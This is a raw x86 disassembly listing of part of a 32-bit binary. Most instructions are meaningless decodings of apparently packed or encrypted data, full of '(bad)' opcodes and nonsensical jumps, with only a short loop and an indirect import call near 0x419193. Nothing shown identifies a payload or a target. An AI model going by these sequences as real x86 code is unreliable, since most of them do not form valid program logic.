  418c4a:	stos   BYTE PTR es:[edi],al
  418c4b:	adc    ah,BYTE PTR [ecx-0x7a88940e]
  418c51:	sbb    DWORD PTR [esi-0xf],edx
  418c54:	xor    DWORD PTR ds:0x8c9b3e52,edi
  418c5a:	rcr    DWORD PTR [ebp-0x46fcb760],0x5c
  418c61:	mov    dh,BYTE PTR [edx+0x62]
  418c64:	xor    edx,DWORD PTR [ebx+0x59c70f5a]
  418c6a:	lock xor dl,BYTE PTR [ebp-0x33]
  418c6e:	mov    ds:0x7338ed4e,al
  418c73:	inc    edi
  418c74:	pop    ebp
  418c75:	inc    edx
  418c76:	jo     0x418c37
  418c78:	mov    DWORD PTR [ebp+0xc],edx
  418c7b:	or     DWORD PTR ds:0x42a3b5,ebx
  418c81:	jmp    0x419193
  418c86:	int    0x3d
  418c88:	cmp    eax,0xd5d7cdd7
  418c8d:	(bad)
  418c90:	not    al
  418c92:	test   al,0x91
  418c94:	jmp    0x7378:0x7feb18d1
  418c9b:	jl     0x418d15
  418c9d:	js     0x418cc2
  418c9f:	push   ss
  418ca0:	(bad)  
  418ca1:	ins    BYTE PTR es:[edi],dx
  418ca2:	ja     0x418ca4
  418ca4:	pop    es
  418ca5:	cmp    DWORD PTR [edx],0xe
  418ca8:	jmp    DWORD PTR [edi]
  418caa:	adc    dl,BYTE PTR [esi+0x6a]
  418cad:	call   FWORD PTR [edi+0x7e0c478c]
  418cb3:	cmp    al,0x83
  418cb5:	inc    edx
  418cb6:	je     0x418c96
  418cb8:	xor    eax,edx
  418cba:	adc    ch,BYTE PTR [esi-0x3a]
  418cbd:	lahf   
  418cbe:	sub    al,0x79
  418cc0:	jge    0x418d03
  418cc2:	shl    BYTE PTR [ebx+0x31],1
  418cc5:	out    0xa0,al
  418cc7:	in     al,0xe4
  418cc9:	xchg   DWORD PTR [esi],ebx
  418ccb:	cdq    
  418ccc:	call   0xbf2ac1d3
  418cd1:	xchg   DWORD PTR [esi+0x3152a47e],ecx
  418cd7:	push   edi
  418cd8:	das    
  418cd9:	stc    
  418cda:	mov    dh,0xa3
  418cdc:	repnz imul edi,DWORD PTR [ecx+0x7d14cea2],0xffffffdc
  418ce4:	sub    edi,DWORD PTR [edi+0x7f8c4a46]
  418cea:	test   BYTE PTR [ebp+0x42],ah
  418ced:	xchg   DWORD PTR [esi],esi
  418cef:	repnz pop edx
  418cf1:	aad    0x61
  418cf3:	stos   DWORD PTR es:[edi],eax
  418cf4:	aas    
  418cf5:	pop    ecx
  418cf6:	mov    edi,0x432c3e49
  418cfc:	jmp    0x418c95
  418cfe:	fs inc ebp
  418d00:	sbb    BYTE PTR [edx],ch
  418d02:	sar    DWORD PTR [edi],cl
  418d04:	pusha  
  418d05:	inc    BYTE PTR [esi+0x7d]
  418d08:	and    dh,BYTE PTR [ebx+0x78]
  418d0b:	xor    eax,0x43d31731
  418d10:	dec    eax
  418d11:	cmp    DWORD PTR [esi],ebp
  418d13:	xchg   BYTE PTR [ecx+0x63],ch
  418d16:	pusha  
  418d17:	inc    eax
  418d18:	jmp    DWORD PTR [edi+0x7b]
  418d1b:	and    BYTE PTR [esi-0x3d],ah
  418d1e:	cld    
  418d1f:	pop    es
  418d20:	or     BYTE PTR [esi],ch
  418d22:	std    
  418d23:	stos   DWORD PTR es:[edi],eax
  418d24:	jae    0x418d99
  418d26:	add    DWORD PTR [edx-0x14ed5e19],esi
  418d2c:	fst    DWORD PTR [ebx]
  418d2e:	pop    ebx
  418d2f:	sub    dl,BYTE PTR [ecx]
  418d31:	sub    eax,0x927c6677
  418d36:	sti    
  418d37:	mul    dl
  418d39:	nop
  418d3a:	inc    ecx
  418d3b:	push   edi
  418d3c:	imul   ecx,DWORD PTR [esi],0x6c
  418d3f:	xchg   ebp,eax
  418d40:	mov    eax,0x4b4b9aea
  418d45:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d47:	jecxz  0x418cfe
  418d49:	mov    ebp,edi
  418d4b:	jbe    0x418d42
  418d4d:	pop    edi
  418d4e:	cdq    
  418d4f:	in     al,dx
  418d50:	and    BYTE PTR [edx+0x48],dh
  418d53:	aas    
  418d54:	test   BYTE PTR [eax+0x699f67f],ah
  418d5a:	jno    0x418d32
  418d5c:	adc    esp,DWORD PTR [edx]
  418d5e:	sbb    DWORD PTR gs:[edi+0x6f],0xffffff99
  418d63:	inc    esp
  418d64:	jae    0x418ce8
  418d66:	and    BYTE PTR [eax],al
  418d68:	xchg   esp,eax
  418d69:	jg     0x418d6f
  418d6b:	cmp    al,0xef
  418d6d:	out    dx,al
  418d6e:	sbb    al,0x9
  418d70:	xchg   esi,eax
  418d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d72:	xor    al,0x18
  418d74:	adc    BYTE PTR [eax-0x47],bl
  418d77:	(bad)  
  418d78:	mov    ds:0x82d92e42,al
  418d7d:	mov    ch,0xc5
  418d7f:	loopne 0x418d76
  418d81:	push   edi
  418d82:	mov    dl,0x8d
  418d84:	outs   dx,BYTE PTR ds:[esi]
  418d85:	push   ss
  418d86:	aam    0x83
  418d88:	push   es
  418d89:	jnp    0x418de1
  418d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d8c:	lea    esp,es:[ebx]
  418d8f:	aas    
  418d90:	dec    edi
  418d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d92:	sti    
  418d93:	std    
  418d94:	xchg   edx,eax
  418d95:	int    0xb3
  418d97:	nop
  418d98:	pop    ebx
  418d99:	add    BYTE PTR [edx-0x205e1e01],bh
  418d9f:	out    dx,eax
  418da0:	icebp  
  418da1:	stos   BYTE PTR es:[edi],al
  418da2:	hlt    
  418da3:	pop    esp
  418da4:	jg     0x418d74
  418da6:	clc    
  418da7:	call   0x31dc170a
  418dac:	mov    bl,0xc9
  418dae:	sbb    al,0x9
  418db0:	(bad)  
  418db1:	iret   
  418db2:	mov    ecx,0x370bb8c4
  418db7:	sub    esi,DWORD PTR [esi-0x2c]
  418dba:	retf   
  418dbb:	jge    0x418d80
  418dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dbe:	pop    esi
  418dbf:	outs   dx,BYTE PTR ds:[esi]
  418dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc1:	clc    
  418dc2:	inc    esp
  418dc3:	adc    al,BYTE PTR [eax+0x4d2e81b2]
  418dc9:	adc    al,0x18
  418dcb:	mov    eax,ds:0x21aa930f
  418dd0:	jecxz  0x418de1
  418dd2:	push   ss
  418dd3:	mov    esp,0x4468f04d
  418dd8:	test   ch,al
  418dda:	cmp    edi,DWORD PTR [ebp-0x42]
  418ddd:	xchg   edi,eax
  418dde:	sub    ah,0x68
  418de1:	cs retf 0x456a
  418de5:	pusha  
  418de6:	mov    bl,0x8
  418de8:	rcr    edx,cl
  418dea:	shr    DWORD PTR cs:[esi],1
  418ded:	stc    
  418dee:	fisubr WORD PTR [esi]
  418df0:	fcmovnbe st,st(5)
  418df2:	sar    BYTE PTR [edi],1
  418df4:	push   edi
  418df5:	push   edx
  418df6:	cld    
  418df7:	enter  0x9306,0xcd
  418dfb:	in     eax,0x3c
  418dfd:	loopne 0x418e2e
  418dff:	ror    ah,cl
  418e01:	jns    0x418e5e
  418e03:	xchg   ecx,eax
  418e04:	inc    esi
  418e05:	push   esi
  418e06:	lea    eax,[edi]
  418e08:	jge    0x418e1e
  418e0a:	in     eax,0xed
  418e0c:	dec    ebx
  418e0d:	mov    dh,0x74
  418e0f:	in     eax,dx
  418e10:	xchg   ecx,eax
  418e11:	retf   
  418e12:	push   ebp
  418e13:	mov    al,ds:0x8c79eab4
  418e18:	sub    dh,bl
  418e1a:	out    0xc1,al
  418e1c:	pop    esp
  418e1d:	pushf  
  418e1e:	pushf  
  418e1f:	inc    eax
  418e20:	xor    al,bh
  418e22:	pop    DWORD PTR [edx]
  418e24:	es aad 0x17
  418e27:	test   DWORD PTR [edx-0x4b],edx
  418e2a:	lahf   
  418e2b:	std    
  418e2c:	rcl    BYTE PTR [esi-0x69],0xba
  418e30:	loop   0x418e8e
  418e32:	inc    esi
  418e33:	xlat   BYTE PTR ds:[ebx]
  418e34:	rol    eax,0xec
  418e37:	call   0xbd43:0xb031171a
  418e3e:	pop    ecx
  418e3f:	sub    eax,0x64881235
  418e44:	inc    esi
  418e45:	fcmovnbe st,st(4)
  418e47:	sbb    DWORD PTR [ecx-0x5a],ebp
  418e4a:	mov    ebp,0xf5539e59
  418e4f:	push   ebx
  418e50:	int    0x93
  418e52:	cmp    al,0x58
  418e54:	push   esi
  418e55:	aad    0xd3
  418e57:	cmp    ebp,edx
  418e59:	sub    BYTE PTR [eax+0xbdbfd6c],0x16
  418e60:	sar    BYTE PTR [esi],cl
  418e62:	mov    bl,0x77
  418e64:	push   eax
  418e65:	clc    
  418e66:	sbb    edx,DWORD PTR ds:0xbc09a535
  418e6c:	xor    al,al
  418e6e:	les    esi,FWORD PTR [edx]
  418e70:	sbb    al,0xd7
  418e72:	fstp   QWORD PTR [eax-0x2576ea7e]
  418e78:	mov    bl,0xb1
  418e7a:	and    al,0xb6
  418e7c:	gs xchg edi,eax
  418e7e:	mov    edx,0xdc248928
  418e83:	aam    0x18
  418e85:	(bad)  
  418e86:	sti    
  418e87:	mov    ebx,eax
  418e89:	es out dx,al
  418e8b:	xor    esp,DWORD PTR [eax+edi*1]
  418e8e:	ss int3 
  418e90:	in     eax,dx
  418e91:	fdivr  st,st(2)
  418e93:	stos   DWORD PTR es:[edi],eax
  418e94:	test   DWORD PTR [esi+esi*1-0x66],ebx
  418e98:	into   
  418e99:	sub    BYTE PTR [ecx-0x588d99c1],bh
  418e9f:	aaa    
  418ea0:	arpl   WORD PTR [ecx],bx
  418ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ea3:	test   al,0xda
  418ea5:	fisttp DWORD PTR [esi]
  418ea7:	ins    DWORD PTR es:[edi],dx
  418ea8:	retf   
  418ea9:	les    esi,FWORD PTR [eax+0x18e4df99]
  418eaf:	push   ds
  418eb0:	mov    DWORD PTR [edi+0x25],0x1730eed7
  418eb7:	sbb    eax,0xc7e4414
  418ebc:	jp     0x418e46
  418ebe:	push   ebp
  418ebf:	jns    0x418eaa
  418ec1:	and    cl,BYTE PTR [edx]
  418ec3:	pushf  
  418ec4:	jg     0x418f3c
  418ec6:	add    al,0xf9
  418ec8:	jp     0x418f1f
  418eca:	jnp    0x418f4b
  418ecc:	int3   
  418ecd:	dec    ecx
  418ece:	fadd   QWORD PTR [ecx+0x54a522db]
  418ed4:	jmp    0x418ed2
  418ed6:	pop    ss
  418ed7:	jle    0x418e87
  418ed9:	mov    dh,0xc3
  418edb:	nop
  418edc:	shr    DWORD PTR fs:[ecx+ecx*1],0x5b
  418ee1:	adc    al,BYTE PTR [ecx]
  418ee3:	and    ah,BYTE PTR [edi]
  418ee5:	cwde   
  418ee6:	outs   dx,BYTE PTR ds:[esi]
  418ee7:	ss push 0x76
  418eea:	cmp    eax,0x92766fef
  418eef:	xchg   DWORD PTR [edi],edi
  418ef1:	mov    eax,ds:0xdddca2dd
  418ef6:	std    
  418ef7:	into   
  418ef8:	shr    dl,0xb0
  418efb:	inc    esi
  418efc:	jl     0x418f5c
  418efe:	mov    DWORD PTR ds:0x154f9d8b,ecx
  418f04:	inc    ebx
  418f05:	or     BYTE PTR [si+0x5abf],bl
  418f0a:	ins    BYTE PTR es:[edi],dx
  418f0b:	push   ss
  418f0c:	or     ecx,esi
  418f0e:	in     eax,dx
  418f0f:	nop
  418f10:	imul   esi,DWORD PTR [esi+0x6e],0x53c11d28
  418f17:	jmp    0x418f8c
  418f19:	mov    edx,0xa91fcfd2
  418f1e:	sub    edx,DWORD PTR [esi+0x3b]
  418f21:	sub    DWORD PTR [edx+0x4b],esp
  418f24:	icebp  
  418f25:	cmp    DWORD PTR [edi+esi*4-0x316bd9f7],edx
  418f2c:	sbb    al,BYTE PTR [edi+edx*8]
  418f2f:	ins    BYTE PTR es:[edi],dx
  418f30:	hlt    
  418f31:	jge    0x418f93
  418f33:	sub    ebp,DWORD PTR [edi+0x3f]
  418f36:	mov    eax,DWORD PTR [edi+0x2f]
  418f39:	outs   dx,DWORD PTR ds:[esi]
  418f3a:	mov    esi,0x6ba59130
  418f3f:	inc    esi
  418f40:	push   edx
  418f41:	fsubr  QWORD PTR [edi+eax*4+0x21e4be5a]
  418f48:	push   ebx
  418f49:	jl     0x418fc2
  418f4b:	cmp    al,0x4
  418f4d:	or     eax,0xf37695f0
  418f52:	inc    ebx
  418f53:	sub    eax,DWORD PTR [ebp-0x53]
  418f56:	cdq    
  418f57:	xchg   esi,eax
  418f58:	adc    al,BYTE PTR [eax-0x5ab6e9fb]
  418f5e:	pop    ds
  418f5f:	or     ebp,DWORD PTR [eax-0x216dbe66]
  418f65:	adc    esi,DWORD PTR cs:[eax-0x2bc8aa8f]
  418f6c:	lock lds ebx,FWORD PTR [ecx+ebx*1]
  418f70:	mov    bh,0x6c
  418f72:	mov    ecx,0x775c8cc9
  418f77:	cld    
  418f78:	dec    edi
  418f79:	dec    esp
  418f7a:	jp     0x418fdf
  418f7c:	mov    edi,0xdc16a3e7
  418f81:	jge    0x418fe9
  418f83:	cwde   
  418f84:	mov    dh,0x1c
  418f86:	dec    ecx
  418f87:	leave  
  418f88:	add    al,0x3
  418f8a:	pop    es
  418f8b:	jmp    0x418ff8
  418f8d:	test   BYTE PTR [ecx-0x52],0xbb
  418f91:	xor    ecx,DWORD PTR ds:0x85ee9ed7
  418f97:	mov    ds:0xdd676d06,al
  418f9c:	jo     0x418fa3
  418f9e:	out    0xbc,al
  418fa0:	dec    edx
  418fa1:	call   0xe52ed6be
  418fa6:	shr    dl,1
  418fa8:	dec    ebp
  418fa9:	jg     0x418fe2
  418fab:	in     eax,dx
  418fac:	cmp    dh,BYTE PTR [esi]
  418fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418faf:	sbb    al,0xfa
  418fb1:	inc    edi
  418fb2:	inc    ebp
  418fb3:	jae    0x418ffd
  418fb5:	daa    
  418fb6:	arpl   WORD PTR [ebx+0x21],bx
  418fb9:	xchg   ebp,eax
  418fba:	je     0x418f84
  418fbc:	(bad)  
  418fbd:	adc    ebp,DWORD PTR [ebx-0x60]
  418fc0:	sub    eax,0x5ff67594
  418fc5:	add    dh,BYTE PTR [edi-0x75cdd18]
  418fcb:	mov    dh,0xe6
  418fcd:	or     dh,BYTE PTR [edi+0x7c]
  418fd0:	sbb    al,0xbf
  418fd2:	les    esp,FWORD PTR [eax+ebp*1-0x46]
  418fd6:	dec    edi
  418fd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd8:	jns    0x418f65
  418fda:	inc    edi
  418fdb:	sub    cl,cl
  418fdd:	xor    BYTE PTR [esi],bl
  418fdf:	fidiv  DWORD PTR [ecx]
  418fe1:	shr    BYTE PTR [eax+0x77befec],0xa4
  418fe8:	call   0xae89:0xbae9ce01
  418fef:	call   DWORD PTR [ebx+0x32]
  418ff2:	mov    dh,0xfa
  418ff4:	fs xor al,0x94
  418ff7:	aaa    
  418ff8:	fsubrp st(2),st
  418ffa:	and    ebx,DWORD PTR ds:0x94a72dfa
  419000:	mov    eax,0x501096bd
  419005:	test   BYTE PTR [ebp+0x2801260d],al
  41900b:	jns    0x419028
  41900d:	ror    BYTE PTR [ebx],cl
  41900f:	xor    BYTE PTR ds:0x2e8c3d77,ch
  419015:	mov    ebp,0x56661ed0
  41901a:	in     eax,0x72
  41901c:	fiadd  DWORD PTR [edi-0x26725217]
  419022:	(bad)  
  419023:	xor    BYTE PTR [ebp-0x63e438a6],dl
  419029:	dec    edi
  41902a:	push   es
  41902b:	mov    ch,0xfa
  41902d:	push   ecx
  41902e:	loope  0x4190a4
  419030:	(bad)  
  419031:	(bad)  
  419032:	jle    0x41904c
  419034:	jnp    0x419062
  419036:	rol    DWORD PTR [edi],1
  419038:	jg     0x41902f
  41903a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41903b:	fs mov ebp,0x65d26422
  419041:	enter  0x8a7b,0x6d
  419045:	sub    dl,dl
  419047:	les    edx,FWORD PTR [edx-0x78b79099]
  41904d:	mov    eax,ds:0x3d685eaa
  419052:	pop    ebp
  419053:	mov    ds,WORD PTR [eax-0x115daac7]
  419059:	sub    DWORD PTR [esi-0x309edeb6],eax
  41905f:	(bad)  
  419060:	hlt    
  419061:	aaa    
  419062:	mov    edi,esp
  419064:	ret    0x53f3
  419067:	ins    BYTE PTR es:[edi],dx
  419068:	dec    esp
  419069:	pop    esp
  41906a:	push   cs
  41906b:	arpl   WORD PTR [ebx-0x36],ax
  41906e:	xchg   esi,eax
  41906f:	ficom  DWORD PTR [edx-0x9]
  419072:	mov    esp,?
  419074:	in     al,dx
  419075:	adc    esi,edi
  419077:	sahf   
  419078:	dec    edx
  419079:	inc    ebx
  41907a:	sub    eax,0xde8c7a22
  41907f:	aas    
  419080:	mov    cs,WORD PTR [esi+0x62]
  419083:	and    DWORD PTR [eax],ecx
  419085:	xchg   edi,eax
  419086:	repnz outs dx,DWORD PTR ds:[esi]
  419088:	pop    ebx
  419089:	sbb    eax,DWORD PTR ds:0xfa7f7d3a
  41908f:	cmp    BYTE PTR [edx],ah
  419091:	aas    
  419092:	ja     0x41907e
  419094:	mov    ebx,0x1b57b802
  419099:	or     eax,DWORD PTR [eax-0x67]
  41909c:	sar    BYTE PTR [esi+0x568365cc],1
  4190a2:	and    DWORD PTR [ebx+eiz*1],ebp
  4190a5:	sbb    BYTE PTR [eax-0x52],dh
  4190a8:	pop    ds
  4190a9:	mov    esp,0xb582a0e
  4190ae:	scas   al,BYTE PTR es:[edi]
  4190af:	les    esi,FWORD PTR [esi]
  4190b1:	push   ebx
  4190b2:	xchg   esi,eax
  4190b3:	fiadd  DWORD PTR [eax]
  4190b5:	ins    BYTE PTR es:[edi],dx
  4190b6:	add    BYTE PTR [ecx-0x31],dh
  4190b9:	retf   
  4190ba:	sub    eax,0x44d0b319
  4190bf:	pop    esi
  4190c0:	add    al,0x43
  4190c2:	push   esi
  4190c3:	and    ecx,edi
  4190c5:	lods   eax,DWORD PTR ds:[esi]
  4190c6:	push   ds
  4190c7:	jmp    DWORD PTR [esp+ebp*2]
  4190ca:	cmp    BYTE PTR [ecx+0x2a],dh
  4190cd:	aas    
  4190ce:	push   esp
  4190cf:	jbe    0x41908e
  4190d1:	adc    esi,ecx
  4190d3:	daa    
  4190d4:	pop    ecx
  4190d5:	dec    ebx
  4190d6:	mov    esi,0x2e343c73
  4190db:	aad    0xfb
  4190dd:	mov    BYTE PTR [ecx+0x7cf8f81a],dl
  4190e3:	aad    0xf3
  4190e5:	mov    ebp,0xbf45ac16
  4190ea:	push   0x17
  4190ec:	iret   
  4190ed:	xlat   BYTE PTR ds:[ebx]
  4190ee:	xor    al,0x97
  4190f0:	mov    esi,0x8a7d5573
  4190f5:	aas    
  4190f6:	mov    cr4,ebp
  4190f9:	fadd   DWORD PTR [edi+0xa]
  4190fc:	fucomip st,st(3)
  4190fe:	adc    bh,BYTE PTR [edi+0x79]
  419101:	sub    eax,0xfd55727a
  419106:	retf   
  419107:	pop    esi
  419108:	push   es
  419109:	push   edx
  41910a:	out    dx,al
  41910b:	sbb    DWORD PTR ds:0xa24d9fef,esi
  419111:	lods   eax,DWORD PTR ds:[esi]
  419112:	stos   DWORD PTR es:[edi],eax
  419113:	or     al,0x7e
  419115:	cs inc esi
  419117:	xchg   esp,eax
  419118:	loope  0x41916b
  41911a:	ror    BYTE PTR [esi],cl
  41911c:	cmp    eax,0x9048c601
  419121:	fstp   TBYTE PTR [esi-0x4e83c96c]
  419127:	add    eax,edx
  419129:	jbe    0x4190cd
  41912b:	push   edi
  41912c:	ds mov eax,0x2b07f0c9
  419132:	rol    DWORD PTR [edi],cl
  419134:	ss inc edx
  419136:	or     BYTE PTR [edi+ebp*1],ch
  419139:	xchg   esp,eax
  41913a:	fld    QWORD PTR [ebp-0x3c875880]
  419140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419141:	int3   
  419142:	push   ecx
  419143:	ror    esp,1
  419145:	fmul   st(5),st
  419147:	(bad)  
  419148:	shl    edx,1
  41914a:	je     0x4190f7
  41914c:	jge    0x419139
  41914e:	fnstcw WORD PTR [edx-0x2378295f]
  419154:	dec    esp
  419155:	adc    BYTE PTR [ecx-0x52],cl
  419158:	jle    0x41913f
  41915a:	in     al,dx
  41915b:	(bad)  
  41915c:	fimul  WORD PTR [edx-0x2]
  41915f:	test   eax,0x7741ed67
  419164:	jne    0x419116
  419166:	add    eax,0x34d147fc
  41916b:	xchg   edx,eax
  41916c:	add    DWORD PTR [edx-0x6fa5f27b],eax
  419172:	sub    al,0xa6
  419174:	or     cl,BYTE PTR es:[ecx+0xc3715d5]
  41917b:	jmp    0xf75e:0xf55a99ae
  419182:	cmp    ecx,DWORD PTR [edi]
  419184:	adc    edi,DWORD PTR [edi-0x54044de]
  41918a:	sub    BYTE PTR [eax+ebp*8],ch
  41918d:	pop    ebp
  41918e:	and    DWORD PTR [edi+ebx*4],ebx
  419191:	add    al,0x79
  419193:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  41919a:	adc    DWORD PTR ds:0x42a37d,0x11fe
  4191a4:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  4191ab:	sbb    edi,0x48d3
  4191b1:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  4191b8:	and    DWORD PTR ds:0x42a339,0x0
  4191c2:	mov    edx,DWORD PTR ds:0x42a339
  4191c8:	inc    edx
  4191c9:	mov    DWORD PTR ds:0x42a339,edx
  4191cf:	cmp    DWORD PTR ds:0x42a339,0x1c
  4191d6:	jne    0x4191f6
  4191dc:	push   0x42a2d9
  4191e1:	push   0x39c2
  4191e6:	push   0x8f9d
  4191eb:	push   0x3fa2
  4191f0:	call   DWORD PTR ds:0x425354
  4191f6:	cmp    DWORD PTR ds:0x42a339,0x12
  4191fd:	jb     0x4191c2
  419203:	xor    edx,edx
  419205:	xor    edx,DWORD PTR ds:0x42a331
  41920b:	add    DWORD PTR ds:0x42a2e9,edx
  419211:	jmp    0x419723
  419216:	retf   
  419217:	ret    
  419218:	ds ret 
  41921a:	mov    cl,0xc9
  41921d:	retf   
  41921e:	xadd   esp,eax
  419221:	xor    BYTE PTR [edx+edx*2],dh
  419224:	xchg   ah,bh
  419226:	adc    ebp,esi
  419228:	jg     0x4192a2
  41922a:	jae    0x4192a8
  41922c:	js     0x4192a6
  41922e:	ret    
  41922f:	sti    
  419230:	(bad)  
  419231:	pop    edi
  419232:	add    edi,DWORD PTR [eax-0x2]
  419235:	push   esp
  419236:	sub    ah,ch
  419238:	dec    esp
  419239:	test   eax,0x1701473c
  41923e:	add    eax,0x7459b9c
  419243:	scas   al,BYTE PTR es:[edi]
  419244:	push   ebx
  419245:	in     eax,dx
  419246:	scas   al,BYTE PTR es:[edi]
  419247:	iret   
  419248:	cmp    al,0xdd
  41924a:	out    dx,eax
  41924b:	das    
  41924c:	mov    dl,0xe3
  41924e:	in     eax,0x7c
  419250:	ja     0x4191f4
  419252:	stos   BYTE PTR es:[edi],al
  419253:	aad    0xb9
  419255:	mov    WORD PTR [ebx+0xeeebe6e],fs
  41925b:	stos   BYTE PTR es:[edi],al
  41925c:	xor    eax,edi
  41925e:	cmp    dh,BYTE PTR fs:[eax+0x37]
  419262:	repz jecxz 0x41923f
  419265:	push   ebp
  419266:	lds    ebx,FWORD PTR [esi+0x45]
  419269:	fild   QWORD PTR [edi+0x63]
  41926c:	and    eax,0xbb7b59d3
  419271:	aaa    
  419272:	add    eax,0x2b078386
  419277:	in     eax,dx
  419278:	mov    ds:0xb7f132ec,al
  41927d:	xchg   esi,eax
  41927e:	sti    
  41927f:	and    al,0xe3
  419281:	int    0xe
  419283:	fs cwde 
  419285:	mov    ds:0x9de96e90,al
  41928a:	dec    eax
  41928b:	mov    cl,BYTE PTR [esi+ecx*1-0x3ac0c5e9]
  419292:	outs   dx,BYTE PTR ds:[esi]
  419293:	push   0xdbb3142b
  419298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419299:	ja     0x4192b8
  41929b:	stc    
  41929c:	pop    ss
  41929d:	jnp    0x41922f
  41929f:	inc    edx
  4192a0:	jge    0x4192f0
  4192a2:	adc    eax,0xf56bcba8
  4192a7:	dec    DWORD PTR [ebx+0x15d9c2c9]
  4192ad:	scas   eax,DWORD PTR es:[edi]
  4192ae:	out    0x72,eax
  4192b0:	fst    DWORD PTR [ecx+0x2e]
  4192b3:	imul   esi,DWORD PTR [esi-0x56],0xffffff89
  4192b7:	daa    
  4192b8:	imul   ecx,DWORD PTR [ecx+edi*2+0xd],0xd36f9fd4
  4192c0:	inc    esp
  4192c1:	sbb    al,0xb7
  4192c3:	sbb    DWORD PTR [ebp-0x5553e24a],ebp
  4192c9:	sbb    al,0x6e
  4192cb:	loopne 0x4192fe
  4192cd:	xchg   ecx,eax
  4192ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192cf:	int    0xcf
  4192d1:	pop    esi
  4192d2:	test   al,0xed
  4192d4:	loopne 0x419326
  4192d6:	jecxz  0x419283
  4192d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192d9:	pop    esi
  4192da:	sbb    bh,dl
  4192dc:	popa   
  4192dd:	adc    edx,0x68
  4192e0:	pop    eax
  4192e1:	mov    al,ds:0x7fb57018
  4192e6:	aaa    
  4192e7:	aad    0x4b
  4192e9:	sbb    cl,BYTE PTR [eax]
  4192eb:	out    0xc5,eax
  4192ed:	sub    DWORD PTR [esi-0x38883ec9],edx
  4192f3:	jl     0x419285
  4192f5:	push   0x42fed941
  4192fa:	shl    BYTE PTR [ecx-0x51],cl
  4192fd:	add    ecx,0x6b
  419300:	cs rcl BYTE PTR fs:[edx],1
  419304:	add    edi,ebx
  419306:	inc    DWORD PTR [esi-0x3ddb3ee8]
  41930c:	bound  eax,QWORD PTR es:[ecx+ebx*4+0x6ed7943d]
  419314:	mov    eax,0xdf23f5
  419319:	pop    edx
  41931a:	pop    ebp
  41931b:	mov    ah,0x9f
  41931d:	mov    bl,0xd9
  41931f:	out    dx,al
  419320:	adc    al,0x2b
  419323:	lods   eax,DWORD PTR ds:[esi]
  419324:	lahf   
  419325:	or     BYTE PTR [ecx+ebp*4],al
  419328:	push   0x4e
  41932a:	mov    esi,0xecfcd5d7
  41932f:	sub    al,0xa9
  419331:	xchg   ecx,eax
  419332:	pop    esi
  419333:	push   cs
  419334:	rcl    BYTE PTR [edi-0x7e],0xbd
  419338:	not    BYTE PTR [bx+di+0x14b]
  41933d:	mov    eax,0xda244636
  419342:	bound  edx,QWORD PTR [ecx+0x55]
  419345:	cdq    
  419346:	ds cs cs push ecx
  41934a:	push   edx
  41934b:	pop    ebp
  41934c:	mov    ebp,0xf9e94ce1
  419351:	push   ebp
  419352:	(bad)  
  419353:	leave  
  419354:	dec    esp
  419355:	cmp    ebp,DWORD PTR [edx]
  419357:	add    al,0x1f
  419359:	retf   0x9db6
  41935c:	in     al,0x30
  41935e:	jle    0x41932d
  419360:	jbe    0x4193a2
  419362:	cld    
  419363:	(bad)  
  419365:	push   cs
  419366:	ds pop ebp
  419368:	mov    BYTE PTR [esi],cl
  41936a:	push   es
  41936b:	out    dx,al
  41936c:	jnp    0x4192ff
  41936e:	dec    edx
  41936f:	adc    esp,ecx
  419371:	ret    
  419372:	ins    BYTE PTR es:[edi],dx
  419373:	ret    
  419374:	in     al,0xcd
  419376:	(bad)  
  419377:	fild   QWORD PTR [eax]
  419379:	inc    eax
  41937a:	ins    DWORD PTR es:[edi],dx
  41937b:	dec    esi
  41937c:	xchg   esi,eax
  41937d:	xor    esp,DWORD PTR [ebp-0x6f]
  419380:	push   ds
  419381:	ficom  DWORD PTR [edi-0x48]
  419384:	pushf  
  419385:	outs   dx,DWORD PTR ds:[esi]
  419386:	ja     0x419341
  419388:	push   ebp
  419389:	add    eax,0x414d3a69
  41938e:	sti    
  41938f:	sub    bh,ah
  419391:	pop    DWORD PTR [edx+0x5c11a6dc]
  419397:	mov    eax,0x6f34dfd6
  41939c:	repz and DWORD PTR [esi-0xd],edi
  4193a0:	xor    esp,ecx
  4193a2:	outs   dx,BYTE PTR ds:[esi]
  4193a3:	jae    0x41940c
  4193a5:	mov    cl,BYTE PTR [esi]
  4193a7:	das    
  4193a8:	push   esi
  4193a9:	sbb    dh,BYTE PTR [ecx-0x21]
  4193ac:	and    DWORD PTR [ecx+0x6e],esi
  4193af:	cli    
  4193b0:	add    eax,0x2cfd786a
  4193b5:	xchg   edi,eax
  4193b6:	scas   eax,DWORD PTR es:[edi]
  4193b7:	sahf   
  4193b8:	inc    edx
  4193b9:	sub    DWORD PTR [eax+eax*1-0x59],ebp
  4193bd:	xor    ebp,esi
  4193bf:	es stc 
  4193c1:	inc    eax
  4193c2:	xchg   ebp,edi
  4193c4:	cmc    
  4193c5:	(bad)  
  4193c6:	dec    ebx
  4193c7:	aaa    
  4193c8:	rcl    BYTE PTR [edi-0x3287d7fd],cl
  4193ce:	sub    al,0x9a
  4193d0:	mov    ebp,0xf49924d
  4193d5:	cmp    eax,0x7cdb8bbe
  4193da:	jnp    0x419402
  4193dc:	cmc    
  4193dd:	sub    eax,ebx
  4193df:	es xchg ebx,eax
  4193e1:	cdq    
  4193e2:	out    dx,al
  4193e3:	mov    dl,0x8c
  4193e5:	xchg   edi,eax
  4193e6:	fcmovb st,st(0)
  4193e8:	xchg   DWORD PTR [esp+edx*2+0x1f06ea1c],ebx
